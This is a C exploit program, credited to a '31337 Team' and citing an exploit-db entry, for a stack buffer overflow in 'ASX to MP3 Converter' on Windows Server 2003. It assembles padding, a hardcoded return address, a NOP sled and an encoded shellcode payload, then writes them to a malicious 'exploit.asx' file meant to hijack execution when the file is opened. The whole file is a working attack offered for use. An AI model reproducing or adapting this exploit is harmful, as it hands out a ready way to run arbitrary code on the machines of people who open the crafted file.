/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
*/

#include <stdio.h>
#include <string.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(245);
    for(i = 0; i < 245; i += 1) {
        char padding[] = "\x41";
        strcat(overwrite_offset, padding);
    }

    char retn[] = "\x9d\x78\x03\x10";
    char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    "\xbf\x43\x9b\xda\x01\xda\xda\xd9\x74\x24\xf4\x5e\x31\xc9"
    "\xb1\x52\x83\xee\xfc\x31\x7e\x0e\x03\x3d\x95\x38\xf4\x3d"
    "\x41\x3e\xf7\xbd\x92\x5f\x71\x58\xa3\x5f\xe5\x29\x94\x6f"
    "\x6d\x7f\x19\x1b\x23\x6b\xaa\x69\xec\x9c\x1b\xc7\xca\x93"
    "\x9c\x74\x2e\xb2\x1e\x87\x63\x14\x1e\x48\x76\x55\x67\xb5"
    "\x7b\x07\x30\xb1\x2e\xb7\x35\x8f\xf2\x3c\x05\x01\x73\xa1"
    "\xde\x20\x52\x74\x54\x7b\x74\x77\xb9\xf7\x3d\x6f\xde\x32"
    "\xf7\x04\x14\xc8\x06\xcc\x64\x31\xa4\x31\x49\xc0\xb4\x76"
    "\x6e\x3b\xc3\x8e\x8c\xc6\xd4\x55\xee\x1c\x50\x4d\x48\xd6"
    "\xc2\xa9\x68\x3b\x94\x3a\x66\xf0\xd2\x64\x6b\x07\x36\x1f"
    "\x97\x8c\xb9\xcf\x11\xd6\x9d\xcb\x7a\x8c\xbc\x4a\x27\x63"
    "\xc0\x8c\x88\xdc\x64\xc7\x25\x08\x15\x8a\x21\xfd\x14\x34"
    "\xb2\x69\x2e\x47\x80\x36\x84\xcf\xa8\xbf\x02\x08\xce\x95"
    "\xf3\x86\x31\x16\x04\x8f\xf5\x42\x54\xa7\xdc\xea\x3f\x37"
    "\xe0\x3e\xef\x67\x4e\x91\x50\xd7\x2e\x41\x39\x3d\xa1\xbe"
    "\x59\x3e\x6b\xd7\xf0\xc5\xfc\x18\xac\xe8\x0c\xf0\xaf\xf2"
    "\xe9\x38\x39\x14\x9b\x2a\x6f\x8f\x34\xd2\x2a\x5b\xa4\x1b"
    "\xe1\x26\xe6\x90\x06\xd7\xa9\x50\x62\xcb\x5e\x91\x39\xb1"
    "\xc9\xae\x97\xdd\x96\x3d\x7c\x1d\xd0\x5d\x2b\x4a\xb5\x90"
    "\x22\x1e\x2b\x8a\x9c\x3c\xb6\x4a\xe6\x84\x6d\xaf\xe9\x05"
    "\xe3\x8b\xcd\x15\x3d\x13\x4a\x41\x91\x42\x04\x3f\x57\x3d"
    "\xe6\xe9\x01\x92\xa0\x7d\xd7\xd8\x72\xfb\xd8\x34\x05\xe3"
    "\x69\xe1\x50\x1c\x45\x65\x55\x65\xbb\x15\x9a\xbc\x7f\x35"
    "\x79\x14\x8a\xde\x24\xfd\x37\x83\xd6\x28\x7b\xba\x54\xd8"
    "\x04\x39\x44\xa9\x01\x05\xc2\x42\x78\x16\xa7\x64\x2f\x17"
    "\xe2\x00"; 

    int buffer_size = strlen(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    strcat(buffer, overwrite_offset);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    FILE * fp;
    fp = fopen("exploit.asx","wb");
    fprintf(fp, buffer);
    fclose(fp);

    return 0;

}